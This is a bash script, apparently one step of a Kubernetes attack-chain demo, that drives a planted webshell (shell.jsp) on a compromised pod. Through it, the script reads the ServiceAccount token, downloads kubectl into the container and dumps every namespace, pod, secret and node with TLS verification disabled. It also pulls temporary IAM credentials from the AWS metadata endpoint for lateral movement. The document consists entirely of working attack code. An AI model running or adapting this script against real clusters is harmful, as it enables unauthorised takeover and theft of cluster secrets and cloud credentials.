#!/bin/bash
###############################################
# STEP 3: Cluster Takeover
# Using the overprivileged ServiceAccount token
# (cluster-admin) to take full control of the
# Kubernetes cluster.
###############################################

set -e

[ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1

SHELL_URL="http://${HOST}/shell.jsp"

remote_exec() {
    curl -s --data-urlencode "cmd=$1" "$SHELL_URL" | tr -d '\0'
}

echo "============================================"
echo " STEP 3: Cluster Takeover via ServiceAccount"
echo "============================================"
echo ""

echo "[+] 3.1 - Read ServiceAccount token from the pod..."
SA_TOKEN=$(remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
echo "    Token (first 50 chars): ${SA_TOKEN:0:50}..."
echo ""

echo "[+] 3.2 - Read cluster CA and API server..."
remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
echo ""
API_SERVER=$(remote_exec "printenv KUBERNETES_SERVICE_HOST")
echo "    API Server: $API_SERVER"
echo ""

echo "[+] 3.3 - Install kubectl in the container..."
remote_exec "curl -sLO https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin/"
echo "    kubectl installed."
echo ""

echo "[+] 3.4 - List all namespaces (proves cluster-admin)..."
remote_exec "kubectl --server=https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT} --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --insecure-skip-tls-verify get namespaces"
echo ""

echo "[+] 3.5 - List all pods across the cluster..."
remote_exec "kubectl --server=https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT} --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --insecure-skip-tls-verify get pods -A"
echo ""

echo "[+] 3.6 - List all secrets across the cluster..."
remote_exec "kubectl --server=https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT} --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --insecure-skip-tls-verify get secrets -A"
echo ""

echo "[+] 3.7 - List cluster nodes..."
remote_exec "kubectl --server=https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT} --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --insecure-skip-tls-verify get nodes -o wide"
echo ""

echo "[+] 3.8 - Check AWS IMDS for IAM credentials (lateral movement to AWS)..."
echo "    Fetching IAM role name..."
ROLE_NAME=$(remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/")
echo "    IAM Role: $ROLE_NAME"
echo ""
echo "    Fetching temporary AWS credentials..."
remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
echo ""

echo "============================================"
echo " CLUSTER TAKEOVER COMPLETE"
echo ""
echo " Attack chain summary:"
echo "   1. Spring4Shell RCE -> webshell on pod"
echo "   2. Privileged container -> node access"
echo "      - hostPID + nsenter = run commands on host"
echo "      - hostPath / = read/write host filesystem"
echo "      - hostNetwork = access IMDS & node network"
echo "   3. cluster-admin SA -> full K8s API access"
echo "   4. IMDS credentials -> lateral movement to AWS"
echo "============================================"
